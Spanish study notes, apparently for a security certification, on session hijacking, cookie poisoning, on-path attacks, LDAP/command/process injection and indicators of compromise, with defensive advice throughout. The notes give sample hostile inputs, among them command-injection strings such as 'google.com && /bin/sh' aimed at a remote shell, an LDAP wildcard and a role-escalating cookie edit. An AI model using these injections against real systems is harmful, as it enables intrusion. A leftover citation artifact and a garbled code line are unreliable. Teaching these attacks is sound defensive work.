- El usuario que inició sesión.
- Las páginas que visitó.
- Su carrito de compras.
- Su progreso en un curso.
- Sus permisos.
- Sus preferencias.

Sin la gestión de sesiones, el servidor trataría cada petición como si proviniera de un usuario completamente nuevo.

---

## ¿Por qué es necesaria?

El protocolo **HTTP es Stateless (sin estado)**.

Esto significa que:

> El servidor **no recuerda automáticamente** quién eres entre una petición y otra.

Por ello, las aplicaciones utilizan:

- Session Tokens.
- Cookies.
- Bases de datos.

para mantener la sesión del usuario.

---

## Cookies

Una **Cookie** es un pequeño archivo de texto que un servidor almacena en el navegador del usuario para guardar información sobre su sesión.

Ejemplo de un curso: nos almacena los procesos que hemos hecho durante el curso, la base de datos nos guarda las secciones, cuestionarios que se van realizando para que la próxima vez que te conectes no se pierdan tus resultados.

Funcionamiento:

```text
Usuario
     │
     │ Solicitud HTTP
     ▼
Servidor
     │
     │ Respuesta HTTP + Cookie
     ▼
Navegador
```

En las siguientes peticiones:

```text
Navegador
     │
     │ Cookie + Solicitud HTTP
     ▼
Servidor
```

Gracias a esa cookie, el servidor reconoce al usuario.

Ahora vamos a dar una analogía del peligro de una cookie si es robada

Imagina un guardarropa en un teatro.

Cuando dejas tu abrigo, te dan un ticket:

Ticket #4582

Ese ticket no dice:

Tu nombre.
Tu dirección.
Qué abrigo tienes.

Solo dice:

4582

Pero quien tenga ese ticket puede retirar el abrigo.

La cookie de sesión funciona de manera muy parecida: normalmente solo contiene un identificador, pero ese identificador le permite al servidor encontrar toda la información del usuario. Por eso robar una cookie de sesión puede ser tan grave, incluso si la cookie no contiene datos personales visibles.

---

## Tipos de Cookies

### 1. Session Cookies (Cookies de Sesión)

Características:

- Se almacenan únicamente en memoria (RAM).
- Se eliminan al cerrar el navegador.
- No permanecen en el disco.

Son las más utilizadas para mantener una sesión autenticada.

---

### 2. Persistent Cookies (Cookies Persistentes)

Características:

- Se almacenan en el navegador.
- Permanecen incluso después de cerrar el navegador.
- Tienen una fecha de expiración.

Ejemplo:

```text
Duración:
7 días
```

Si el usuario vuelve antes de ese tiempo, el servidor aún podrá reconocerlo.

---

## Seguridad de las Cookies

Las cookies pueden contener información sensible, por lo que deben protegerse.

Buenas prácticas:

- Cifrarlas cuando contienen datos importantes.
- Transmitirlas mediante HTTPS.
- Asignarles un tiempo de expiración.
- Eliminarlas cuando finaliza la sesión.

---

## Secuestro de Sesión (Session Hijacking)

El **Session Hijacking** se trata de un tipo de ataque de suplantación de identidad en el que el atacante desconecta un host y luego lo sustituye por su propia máquina, suplantando
la dirección IP del host original o utilizando algún otro mecanismo. tambien en el que un atacante consigue tomar el control de la sesión de un usuario autenticado.

En lugar de conocer la contraseña, el atacante roba o utiliza el identificador de sesión (Session Token o Cookie).

Así, el servidor cree que el atacante es el usuario legítimo.

---

### ¿Cómo funciona?

```text
Usuario inicia sesión
          │
          ▼
Servidor genera Session Token
          │
          ▼
El navegador almacena la Cookie
          │
          ▼
Atacante roba la Cookie
          │
          ▼
La envía al servidor
          │
          ▼
El servidor cree que es el usuario legítimo
```

---

## Formas de realizar un Session Hijacking

### 1. Robo de Cookies

Es la técnica más común.

El atacante obtiene la cookie de sesión mediante:

- Malware.
- Cross-Site Scripting (XSS)/permite inyectar codigo javascript malicioso (se ejecuta en el navegador de otros usuarios)
- Redes inseguras.
- Otros ataques.

Luego la reutiliza para acceder a la cuenta.

---

### 2. Modificación de Cookies

El atacante altera el contenido de una cookie para intentar obtener más privilegios o acceder a funciones restringidas.

---

### 3. Predicción de Session Tokens (Session Prediction)

Algunos servidores generan Session Tokens de forma predecible.

Ejemplo (inseguro):

```text
1001
1002
1003
1004
```

Un atacante podría adivinar:

```text
1005
```

y secuestrar la sesión de otro usuario.

Por eso los Session Tokens deben generarse utilizando números aleatorios criptográficamente seguros.

---

## ¿Qué es un Session Token?

Es un identificador único que representa una sesión autenticada.

Ejemplo:

```text
AB81-93FD-8C22-FF91
```

Mientras ese token sea válido, el servidor reconocerá al usuario.

---

## Cookie Poisoning (Envenenamiento de Cookies)

El **Cookie Poisoning** consiste en modificar el contenido de una cookie después de que el servidor la haya enviado al navegador.

El objetivo es explotar vulnerabilidades de la aplicación web.

Ejemplo:

Cookie original:

```text
Rol=Usuario
```

El atacante intenta modificarla por:

```text
Rol=Administrador
```

Seguramente te preguntaras si el objetivo es atacar al servidor o al usuario?, Principalmente al servidor o a la aplicación web, de ya que el usuario puede verse afectado, pero el verdadero objetivo suele ser explotar la lógica de la aplicación.

Proceso: Normalmente el atacante modifica la cookie almacenada en el navegador del usuario y luego la envía al servidor, el servidor recibe esa cookie manipulada y, si no la valida correctamente, puede aceptar información falsa o podría otorgar privilegios que el usuario no debería tener.

---

## ¿Cómo prevenir el Cookie Poisoning?

#### - Validar siempre las cookies recibidas.

Nunca confiar en lo que envía el navegador.

Ejemplo:

El navegador envía:

rol=admin

El servidor debe comprobar en su base de datos si ese usuario realmente es administrador.

No debe creer el valor solo porque viene en la cookie.

#### - Cifrar la información almacenada.

En lugar de guardar:

rol=admin

guardar un valor cifrado, por ejemplo:

A83D91F2...

Así el usuario no puede leerlo ni modificarlo fácilmente.

Importante: en la práctica, además de cifrar, es más importante firmar la cookie para detectar cualquier modificación.

#### - Firmar digitalmente las cookies.

Es una de las mejores defensas.

El servidor añade una firma criptográfica a la cookie.

Ejemplo:

usuario=Santiago
firma=9A7F2B...

Si el atacante cambia:

usuario=Administrador

la firma deja de coincidir y el servidor rechaza la cookie.

Así detecta cualquier manipulación.

#### - Eliminar las cookies al cerrar la sesión.

Cuando el usuario cierra sesión, el servidor invalida el Session Token y el navegador elimina la cookie.

Así, aunque alguien consiga esa cookie después, ya no servirá.

#### - No almacenar información sensible en texto plano.

Evitar guardar datos como:

rol=admin
saldo=100000
esPremium=true

Lo recomendable es guardar únicamente un identificador de sesión, por ejemplo:

session_id=7F92AB...

Luego el servidor consulta en su base de datos toda la información real del usuario.

---

## Buenas prácticas para proteger las sesiones

- Utilizar HTTPS.
- Cifrar las cookies sensibles.
- Generar Session Tokens aleatorios.
- Invalidar el Session Token al cerrar sesión.
- Establecer tiempos de expiración cortos.
- Validar todas las cookies recibidas.
- Regenerar el Session Token después del inicio de sesión.
- Utilizar autenticación multifactor (MFA).

---

## Session Hijacking vs Replay Attack

| Session Hijacking | Replay Attack |
|-------------------|---------------|
| Roba o secuestra una sesión activa. | Reproduce una comunicación capturada anteriormente. |
| Utiliza principalmente Session Tokens o Cookies robadas. | Reutiliza datos válidos interceptados. |
| La sesión suele seguir activa. | La comunicación puede reproducirse mucho después. |
| El objetivo es controlar la sesión del usuario. | El objetivo es repetir una petición válida. |

---

### Resumen rápido

- **Session Management:** permite identificar a un usuario durante toda su sesión.
- **HTTP es Stateless**, por eso se utilizan Cookies y Session Tokens.
- **Session Cookie:** desaparece al cerrar el navegador.
- **Persistent Cookie:** permanece hasta su fecha de expiración.
- **Session Hijacking:** consiste en robar una sesión autenticada utilizando su Session Token o Cookie.
- **Session Prediction:** intenta adivinar el Session Token.
- **Cookie Poisoning:** modifica una cookie para explotar vulnerabilidades.
- Las mejores defensas son:
  - HTTPS.
  - Cookies cifradas y firmadas.
  - Session Tokens aleatorios.
  - Expiración de sesiones.
  - MFA.

---

## Esquema para memorizar

```text
HTTP (Stateless)
        │
        ▼
Gestión de Sesiones
        │
        ▼
Session Token + Cookie
        │
        ▼
Usuario autenticado
        │
        ▼
─────────────── Ataques ───────────────

Session Hijacking
│
├── Robo de Cookies
├── Modificación de Cookies
└── Predicción de Session Tokens

Cookie Poisoning
│
└── Modificación del contenido de la Cookie

─────────────── Defensa ───────────────

HTTPS
│
Cookies cifradas
│
Session Tokens aleatorios
│
Expiración de sesiones
│
MFA
```
# Ataques On-Path (Man-in-the-Middle - MitM)

## ¿Qué es un ataque On-Path?

Un **On-Path Attack** (antes conocido como **Man-in-the-Middle - MitM**) es un ataque en el que el atacante consigue colocarse **entre dos dispositivos que se están comunicando**.

Desde esa posición puede:

- Interceptar la comunicación.
- Leer los datos.
- Modificar los datos.
- Reenviar los datos al destino.

El cliente y el servidor creen que están hablando directamente entre sí, cuando en realidad toda la comunicación pasa por el atacante.

---

## ¿Cómo funciona?

```text
Comunicación normal

Cliente
    │
    ▼
Servidor
```

Con un ataque On-Path:

```text
Cliente
    │
    ▼
Atacante
    │
    ▼
Servidor
```

Todo el tráfico pasa primero por el atacante.

---

## ¿Qué puede hacer el atacante?

Desde esa posición puede:

- Capturar usuarios y contraseñas.
- Robar cookies de sesión.
- Leer información confidencial.
- Capturar tokens.
- Modificar mensajes.
- Cambiar archivos descargados.
- Redirigir al usuario a sitios falsos.

---

## ¿Cómo consigue ponerse "en el medio"?

Algunas técnicas comunes son:

- **ARP Spoofing / ARP Poisoning** (red local).
- **DNS Spoofing / DNS Poisoning**.
- **Punto de acceso Wi-Fi falso (Evil Twin)**.
- **Switch falso o dispositivo de red malicioso**.

Una vez que logra estar entre el cliente y el servidor, comienza a interceptar el tráfico.

---

## Replay vs Relay

Una vez interceptada la comunicación, el atacante puede utilizar dos técnicas principales.

### 1. Replay (Repetición)

Consiste en:

1. Capturar una comunicación válida.
2. Guardarla.
3. Reenviarla inmediatamente o más tarde.

Ejemplo:

```text
Cliente
     │ Login
     ▼
Servidor

        (El atacante captura el login)

Más tarde...

Atacante
     │ Reenvía exactamente el mismo mensaje
     ▼
Servidor
```

Si el servidor no detecta que la comunicación ya fue utilizada, podría aceptarla.

---

## 2. Relay (Retransmisión)

Aquí el atacante **permanece en medio de la comunicación**.

No espera para reutilizar los datos.

Simplemente recibe cada mensaje y lo reenvía inmediatamente.

```text
Cliente
     │
     ▼
Atacante
     │
     ▼
Servidor
```

Durante ese proceso puede:

- Leer los datos.
- Modificarlos.
- Reenviarlos.

El atacante actúa como un **Proxy** entre ambas partes.

---

## Replay vs Relay

| Replay | Relay |
|---------|--------|
| Captura una comunicación y la reutiliza después. | Intercepta y retransmite la comunicación en tiempo real. |
| Puede haber un retraso entre captura y uso. | Ocurre mientras la comunicación está activa. |
| Normalmente no modifica los datos. | Puede modificar los datos antes de reenviarlos. |

---

## ¿Qué dificulta estos ataques?

El principal obstáculo es el **cifrado**.

Si la comunicación utiliza protocolos modernos como:

- TLS 1.2
- TLS 1.3

el atacante podrá capturar los paquetes, pero no podrá leer fácilmente su contenido.

---

## SSL Stripping

El **SSL Stripping** es un ataque cuyo objetivo es eliminar el uso de HTTPS.

En lugar de:

```text
Cliente
        │ HTTPS
        ▼
Servidor
```

el atacante intenta degradar la conexión a:

```text
Cliente
        │ HTTP
        ▼
Atacante
        │ HTTPS
        ▼
Servidor
```

El cliente cree que está usando una conexión normal, mientras que el atacante puede leer toda la información enviada mediante HTTP.

---

## Downgrade Attack

Un **Downgrade Attack** intenta que el cliente y el servidor utilicen una versión **menos segura** de un protocolo.

Ejemplo:

El cliente quiere negociar:

```text
TLS 1.3
```

El atacante fuerza la negociación para utilizar:

```text
TLS 1.0
```

o antiguamente:

```text
SSL 2.0
```

Al utilizar un protocolo más débil, el atacante tiene más posibilidades de romper el cifrado o explotar vulnerabilidades conocidas.

> **Importante:** Hoy en día **SSL 2.0 y SSL 3.0 están obsoletos e inseguros**, y la mayoría de los sistemas modernos ya no los aceptan. El concepto de *Downgrade Attack* sigue siendo válido porque puede aplicarse a otros protocolos y mecanismos de seguridad.

---

## ¿Dónde pueden ocurrir los Downgrade Attacks?

No solo en HTTPS.

También pueden afectar:

- Wi-Fi.
- VPN.
- TLS.
- SSH.
- Otros protocolos que negocian niveles de seguridad.

Siempre que un atacante consiga que ambas partes utilicen una opción compatible pero menos segura, estará realizando un **Downgrade Attack**.

---

# ¿Cómo prevenir los ataques On-Path?

- Utilizar HTTPS con TLS 1.2 o TLS 1.3.
- Verificar certificados digitales.
- Utilizar HSTS (HTTP Strict Transport Security).
- Utilizar WPA3 en redes Wi-Fi.
- Evitar redes Wi-Fi públicas no confiables.
- Utilizar VPN cuando sea necesario.
- Implementar autenticación multifactor (MFA).

---

# Resumen rápido

- **On-Path Attack (MitM):** el atacante se coloca entre el cliente y el servidor.
- Puede leer, modificar o retransmitir la comunicación.
- **Replay:** captura una comunicación válida y la reutiliza más tarde.
- **Relay:** retransmite la comunicación en tiempo real, pudiendo modificarla.
- **SSL Stripping:** degrada una conexión HTTPS a HTTP para eliminar el cifrado.
- **Downgrade Attack:** fuerza el uso de una versión menos segura de un protocolo.
- El uso de **TLS moderno**, certificados válidos y HSTS ayuda a prevenir estos ataques.

---

# Esquema para memorizar

```text
Cliente
      │
      ▼
Atacante (On-Path)
      │
      ▼
Servidor

El atacante puede:

├── Leer datos
├── Modificar datos
├── Robar Cookies
├── Robar credenciales
├── Replay
└── Relay

───────────────

Replay
│
└── Captura → Guarda → Reenvía después

Relay
│
└── Intercepta → Modifica (opcional) → Reenvía inmediatamente

───────────────

Si existe cifrado fuerte (TLS)

│
└── Más difícil de leer la comunicación

───────────────

Ataques relacionados

SSL Stripping
│
└── HTTPS → HTTP

Downgrade Attack
│
└── TLS moderno → Versión menos segura
```
# Ataques de Inyección: LDAP, Command Injection y Process Injection

En esta sección se estudian tres tipos comunes de ataques de inyección:

- LDAP Injection
- Command Injection
- Process Injection

---

## 1. LDAP Injection

### ¿Qué es LDAP?

**LDAP (Lightweight Directory Access Protocol)** es un protocolo utilizado para acceder y administrar un servicio de directorios.

Se utiliza frecuentemente para almacenar información como:

- Usuarios.
- Contraseñas (o referencias a ellas).
- Grupos.
- Equipos.
- Aplicaciones.
- Permisos.

Es muy común en entornos empresariales como **:contentReference[oaicite:0]{index=0}**.

---

## ¿Qué es una LDAP Injection?

Es un ataque donde el atacante introduce una consulta LDAP maliciosa para modificar la búsqueda que realiza la aplicación.

Es muy parecido a una **SQL Injection**, pero en lugar de atacar una base de datos SQL, ataca un servidor LDAP.

---

## Ejemplo

si el código backend para el servidor utiliza el siguiente código,

  - string ldapSearch = "(cn = $searchName")";
  - System. fuera. println(ldapSearch);

Supongamos que el servidor genera esta consulta:

```text
(cn=Juan)
```

Donde:

- `cn` = Common Name (Nombre común).
- `Juan` = usuario buscado.

Si la aplicación no valida correctamente la entrada y el atacante escribe:

```text
*
```

La consulta se convierte en:

```text
(cn=*)
```

El `*` es un comodín (*wildcard*) que significa:

> "Muéstrame todos los usuarios."

Si el servidor acepta esa consulta, devolverá toda la lista de usuarios.

---

## ¿Cómo prevenir LDAP Injection?

- Validar todas las entradas del usuario.
- Sanitizar caracteres especiales.
- Utilizar consultas parametrizadas cuando sea posible.
- Aplicar el principio de mínimo privilegio.

---

## 2. Command Injection

### ¿Qué es?

Ocurre cuando un atacante consigue ejecutar **comandos del sistema operativo** aprovechando una aplicación web vulnerable.

El problema aparece cuando la aplicación toma directamente la entrada del usuario y la ejecuta en la consola (Shell).

---

### Ejemplo

La aplicación permite comprobar si un servidor responde mediante `ping`.

El usuario introduce:

```text
google.com
```

El servidor ejecuta:

```bash
ping google.com
```

Todo funciona correctamente.

---

## Ataque

El atacante introduce:

```text
google.com && hostname
```

El servidor ejecuta:

```bash
ping google.com && hostname
```

Ahora ejecuta **dos comandos**:

1. `ping google.com`
2. `hostname`

El atacante obtiene el nombre del servidor.

---

## Ataque más grave

Podría intentar ejecutar:

```text
google.com && /bin/sh ...
```

Con ello busca abrir una **Shell remota** y tomar control del servidor.

---

## ¿Cómo prevenir Command Injection?

- Validar todas las entradas.
- Permitir únicamente caracteres esperados.
- Utilizar listas blancas (Whitelist).
- No construir comandos concatenando texto enviado por el usuario.
- Ejecutar aplicaciones con el mínimo privilegio posible.

---

## 3. Process Injection

### ¿Qué es?

La **Process Injection** consiste en inyectar código dentro de un proceso legítimo que ya se encuentra ejecutándose.

El objetivo es que el malware se ejecute **como si fuera parte del proceso legítimo**.

---

### ¿Por qué se utiliza?

Porque muchos antivirus confían en procesos conocidos.

Ejemplos:

- explorer.exe
- svchost.exe
- chrome.exe

Si el malware se ejecuta dentro de uno de ellos, resulta mucho más difícil detectarlo.

---

## ¿Qué consigue el atacante?

- Ejecutar malware oculto.
- Acceder a la memoria de otro proceso.
- Utilizar sus permisos.
- Acceder a recursos del sistema.
- Evadir soluciones de seguridad (EDR/Antivirus).

---

## Técnicas comunes de Process Injection

Algunas técnicas utilizadas son:

- DLL Injection.
- Process Hollowing.
- Process Doppelgänging.
- Asynchronous Procedure Calls (APC Injection).
- Portable Executable (PE Injection).

No es necesario memorizar su funcionamiento en detalle para este tema, pero sí conocer sus nombres.

---

## ¿Cómo prevenir Process Injection?

Para mitigar las inyecciones de procesos, debe utilizar:

- Soluciones de seguridad para puntos finales que estén configuradas para bloquear secuencias comunes de comportamiento de ataque.
- Puede utilizar un módulo del núcleo de seguridad
- Puede utilizar la práctica del mínimo privilegio.

---

## Comparación

| LDAP Injection | Command Injection | Process Injection |
|----------------|-------------------|-------------------|
| Ataca consultas LDAP. | Ejecuta comandos del sistema operativo. | Inyecta código en un proceso legítimo. |
| Similar a SQL Injection. | Ataca el Shell del sistema. | Ataca procesos ya existentes. |
| Busca acceder a usuarios o directorios. | Busca controlar el servidor. | Busca ocultar malware y evadir detección. |

---

# Resumen rápido

- **LDAP Injection:** modifica consultas LDAP para obtener o manipular información del directorio.
- **Command Injection:** ejecuta comandos del sistema operativo mediante una aplicación web vulnerable.
- **Process Injection:** introduce código malicioso dentro de un proceso legítimo para ocultarse y aprovechar sus permisos.
- La mejor defensa contra LDAP y Command Injection es **validar y sanitizar la entrada del usuario**.
- La mejor defensa contra Process Injection es utilizar **EDR**, aplicar el **principio de mínimo privilegio** y supervisar procesos sospechosos.

---

# Esquema para memorizar

```text
Ataques de Inyección

│
├── LDAP Injection
│      │
│      ├── Modifica consultas LDAP
│      └── Busca usuarios, grupos o información del directorio
│
├── Command Injection
│      │
│      ├── Ejecuta comandos del sistema operativo
│      └── Puede obtener una Shell remota
│
└── Process Injection
       │
       ├── Inyecta código en procesos legítimos
       ├── Evade antivirus y EDR
       └── Aprovecha los permisos del proceso
```

# Indicadores de Compromiso (IoC - Indicators of Compromise)

Los **Indicadores de Compromiso (IoC)** son evidencias o rastros digitales que sugieren que un sistema o una red **podrían haber sido comprometidos** por un atacante.

> **Importante:** Un IoC **no confirma** un ataque por sí solo. Es una señal que debe investigarse para determinar si se trata de un compromiso real o de un falso positivo.

---

## 1. Bloqueo de cuentas (Account Lockout)

Ocurre cuando una cuenta es bloqueada tras varios intentos fallidos de inicio de sesión.

### ¿Qué puede indicar?

- Ataque de fuerza bruta.
- Ataque de diccionario.
- Credential Stuffing.
- Un usuario que olvidó su contraseña (falso positivo).

### Mitigación

- Configurar políticas de bloqueo de cuentas.
- Aplicar retrasos entre intentos de inicio de sesión.
- Implementar MFA.

---

## 2. Sesiones Concurrentes (Concurrent Session Usage)

Se detectan **varias sesiones activas** utilizando la misma cuenta al mismo tiempo.

### ¿Qué puede indicar?

- Robo de credenciales.
- Secuestro de sesión.
- Compartición de cuentas.
- Un usuario usando varios dispositivos (falso positivo).

### Ejemplo

```text
Usuario

PC Oficina  ─────────► Sesión activa

Laptop Casa ─────────► Sesión activa
```

Si una sesión está en Argentina y otra en Europa al mismo tiempo, es un fuerte indicio de compromiso.

---

## 3. Contenido Bloqueado (Blocked Content)

Se producen múltiples intentos de acceder o descargar contenido que las políticas de seguridad han bloqueado.

### ¿Qué puede indicar?

- Descarga de malware.
- Robo de información.
- Intento de acceder a archivos restringidos.

---

## 4. Viaje Imposible (Impossible Travel)

Se detectan inicios de sesión desde ubicaciones geográficas incompatibles con el tiempo transcurrido entre ambos accesos.

### Ejemplo

```text
09:00 → Nueva York

10:00 → Londres
```

Es físicamente imposible viajar entre ambas ciudades en una hora.

### ¿Qué puede indicar?

- Robo de credenciales.
- Cuenta comprometida.
- Uso de VPN (falso positivo).

---

## 5. Consumo Anómalo de Recursos

Se observa un aumento inusual en el uso de:

- CPU.
- Memoria RAM.
- GPU.
- Ancho de banda.
- Disco.

### ¿Qué puede indicar?

- Malware.
- Cryptomining.
- DDoS.
- Procesos maliciosos.

### Ejemplo

```text
CPU normal: 20%

CPU actual: 95%
```

Esto puede indicar que el servidor está siendo utilizado para ejecutar procesos maliciosos.

---

## 6. Recursos Inaccesibles

Archivos, bases de datos o servicios dejan de estar disponibles.

### ¿Qué puede indicar?

- Ransomware.
- Corrupción de datos.
- Eliminación de archivos.
- Ataque al servidor.

### Ejemplo

El usuario intenta abrir un documento y aparece una nota de rescate.

---

## 7. Registros Fuera de Horario (Out-of-Cycle Logging)

Se detectan actividades en horarios poco habituales.

### Ejemplo

```text
03:00 AM

Inicio de sesión exitoso.
```

Cuando nadie debería estar trabajando.

### ¿Qué puede indicar?

- Acceso no autorizado.
- Automatización maliciosa.
- Actividad del atacante.

---

## 8. Registros Perdidos (Missing Logs)

Se observan huecos o desaparición de registros.

### ¿Qué puede indicar?

- Manipulación de logs.
- Intento de borrar evidencias.
- Actividad del atacante.

### Ejemplo

```text
01:15

...

(No existen registros)

...

05:40
```

El atacante pudo eliminar esos registros para ocultar sus acciones.

---

## 9. Publicación indicando que la organización fue hackeada

Los atacantes anuncian públicamente el compromiso.

Puede aparecer en:

- Redes sociales.
- Foros de hackers.
- Sitios web.
- Defacement de la página web.

### ¿Qué puede indicar?

- Ataque exitoso.
- Hacktivismo.
- Daño reputacional.
- Extorsión.

---

## ¿Por qué son importantes los IoC?

Los IoC permiten:

- Detectar ataques rápidamente.
- Investigar incidentes.
- Contener amenazas.
- Reducir el impacto del ataque.

---

## IoC ≠ Confirmación de ataque

Un IoC **no significa automáticamente que exista un compromiso**.

Siempre debe analizarse el contexto.

Ejemplos de falsos positivos:

- Un usuario olvidó su contraseña → Bloqueo de cuenta.
- Un empleado usa una VPN → Viaje imposible.
- Un administrador trabaja de madrugada → Registro fuera de horario.
- Un servidor realiza una actualización → Alto consumo de CPU.

Por ello, los analistas SOC revisan los eventos y registros para confirmar si realmente ocurrió un incidente.

---

## Resumen rápido

- **IoC:** evidencia o indicio de una posible intrusión.
- **Bloqueo de cuentas:** posibles ataques de fuerza bruta.
- **Sesiones concurrentes:** posible robo de credenciales.
- **Contenido bloqueado:** intento de acceder a recursos restringidos.
- **Viaje imposible:** accesos desde ubicaciones incompatibles.
- **Consumo anómalo de recursos:** posible malware, DDoS o cryptomining.
- **Recursos inaccesibles:** posible ransomware.
- **Registros fuera de horario:** actividad sospechosa.
- **Registros perdidos:** intento de ocultar evidencias.
- **Publicaciones de hackeo:** evidencia pública del compromiso.
- Un **IoC requiere investigación** antes de concluir que ocurrió un ataque.

---

## Esquema para memorizar

```text
Indicadores de Compromiso (IoC)

│
├── Bloqueo de cuentas
│      └── Fuerza bruta
│
├── Sesiones concurrentes
│      └── Robo de credenciales
│
├── Contenido bloqueado
│      └── Descarga o acceso malicioso
│
├── Viaje imposible
│      └── Inicio de sesión desde ubicaciones incompatibles
│
├── Alto consumo de recursos
│      ├── Malware
│      ├── DDoS
│      └── Cryptomining
│
├── Recursos inaccesibles
│      └── Ransomware
│
├── Registros fuera de horario
│      └── Actividad sospechosa
│
├── Registros perdidos
│      └── Eliminación de evidencias
│
└── Publicación del hackeo
       └── Confirmación pública del compromiso

↓

Todo IoC debe investigarse para determinar si es:

✓ Compromiso real
✗ Falso positivo
```
